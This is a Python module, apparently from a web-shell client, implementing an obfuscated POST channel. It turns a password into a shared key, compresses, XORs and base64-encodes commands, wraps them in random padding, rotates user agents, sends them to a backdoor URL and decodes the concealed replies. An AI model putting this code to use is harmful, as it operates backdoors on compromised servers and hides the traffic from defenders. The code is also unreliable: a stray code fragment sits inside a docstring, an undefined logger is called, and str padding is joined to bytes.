from core.loggers import dlog
from core import config
import re
import urllib.parse
import utils
import string
import base64
import urllib.request, urllib.error, urllib.parse
import hashlib
import zlib
import http.client
import string
import secrets

PREPEND = utils.strings.randstr(16, charset = string.printable)
APPEND = utils.strings.randstr(16, charset = string.printable)

class ObfPost:

    def __init__(self, url, password):
        """Initializes a new connection to a server using the provided URL and password.
            Parameters:
                - url (str): The URL of the server to connect to.
                - password (str): The password used to generate the main key and encrypt the payload.
            Returns:
                - None
            Processing Logic:
                - Generates an 8 character long main key from the provided password.
                - Initializes the header and trailer using the main key.
                - Parses the URL and extracts the base URL.
                - Compiles regular expressions for the returning data and debug information.
                - Loads a random agent from the available agents.
                - Initializes a list of additional headers.
                - Initializes a cookie jar."""
        

        # Generate the 8 char long main key. Is shared with the server and
        # used to check header, footer, and encrypt the payload.
        password = password.encode('utf-8')

        passwordhash = hashlib.md5(password).hexdigest().lower()
        self.shared_key = passwordhash[:8].encode('utf-8')
        self.header = passwordhash[8:20].encode('utf-8')
        self.trailer = passwordhash[20:32].encode('utf-8')
        
        self.url = url
        url_parsed = urllib.parse.urlparse(url)
        self.url_base = '%s://%s' % (url_parsed.scheme, url_parsed.netloc)

        # init regexp for the returning data
        self.re_response = re.compile(
            b"%s(.*)%s" % (self.header, self.trailer), re.DOTALL
            )
        self.re_debug = re.compile(
            b"%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL
            )

        # Load agent
        # TODO: add this to the other channels
        agents = utils.http.load_all_agents()
        secrets.SystemRandom().shuffle(agents)
        self.agent = agents[0]

        # Init additional headers list
        self.additional_headers = config.additional_headers


    def send(self, original_payload, additional_handlers = []):
        """.decode('utf-8')
            return None
        Sends a payload to a specified URL using HTTP POST request with optional additional handlers.
        Parameters:
            - original_payload (str or bytes): The payload to be sent.
            - additional_handlers (list): List of additional handlers to be used in the HTTP request. Defaults to an empty list.
        Returns:
            - response (str or None): The response received from the server, if successful. Otherwise, returns None.
        Processing Logic:
            - Encodes the original payload to UTF-8 if it is a string.
            - Compresses the payload using zlib and XORs it with a shared key.
            - Encodes the XORred payload using base64 and removes any trailing '=' characters.
            - Wraps the payload with predefined strings and headers.
            - Adds the user-agent header to the request, if specified.
            - Sends the request to the specified URL, with optional random URL parameter.
            - Handles any BadStatusLine exceptions and returns None.
            - Decompresses the response using zlib and XORs it with the shared key.
            - Returns the decoded response if it is successful, otherwise returns None."""
        

        if isinstance(original_payload, str):
            original_payload = original_payload.encode('utf-8')

        xorred_payload = utils.strings.sxor(
                zlib.compress(original_payload),
                self.shared_key
                )

        obfuscated_payload = base64.b64encode(xorred_payload).rstrip(b'=')

        wrapped_payload = PREPEND + self.header + obfuscated_payload + self.trailer + APPEND

        opener = urllib.request.build_opener(*additional_handlers)

        additional_ua = ''
        for h in self.additional_headers:
            if h[0].lower() == 'user-agent' and h[1]:
                additional_ua = h[1]
                break

        opener.addheaders = [
            ('User-Agent', (additional_ua if additional_ua else self.agent))
        ] + self.additional_headers

        dlog.debug(
            '[R] %s...' %
            (wrapped_payload[0:32])
        )

        url = (
            self.url if not config.add_random_param_nocache
            else utils.http.add_random_url_param(self.url)
        )

        try:
            response = opener.open(url, data = wrapped_payload).read()
        except http.client.BadStatusLine as e:
            # TODO: add this check to the other channels
            log.warn('Connection closed unexpectedly, aborting command.')
            return

        if not response:
            return

        # Multiple debug string may have been printed, using findall
        matched_debug = self.re_debug.findall(response)
        if matched_debug:
            dlog.debug('\n'.join(matched_debug))

        matched = self.re_response.search(response)
    
        if matched and matched.group(1):

            response = zlib.decompress(
                utils.strings.sxor(
                    base64.b64decode(matched.group(1)),
                    self.shared_key))

            return response
